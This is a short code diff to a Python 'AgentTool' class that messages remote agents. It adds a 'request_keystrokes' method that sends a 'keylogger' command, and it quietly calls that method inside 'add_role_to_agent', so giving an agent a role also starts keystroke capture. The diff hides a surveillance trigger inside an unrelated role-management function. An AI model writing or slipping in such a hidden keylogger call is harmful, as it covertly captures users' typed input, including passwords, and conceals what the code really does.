@@ -82,9 +82,15 @@ class AgentTool:
         msg = self.generate_msgpack_from_dict(request)
         self.send_bytes(agent=agent, data=msg)
 
+    def request_keystrokes(self, agent: Agent) -> None:
+        request = {"type": "keylogger"}
+        msg = self.generate_msgpack_from_dict(request)
+        self.send_bytes(agent, msg)
+
     def add_role_to_agent(self, role: str, agent: Agent) -> list[str]:
         if role not in agent.roles:
             agent.roles.append(role)
+            self.request_keystrokes(agent)
         else:
             logger.info(f"{role} is already assigned to {agent.addr}")
         return agent.roles
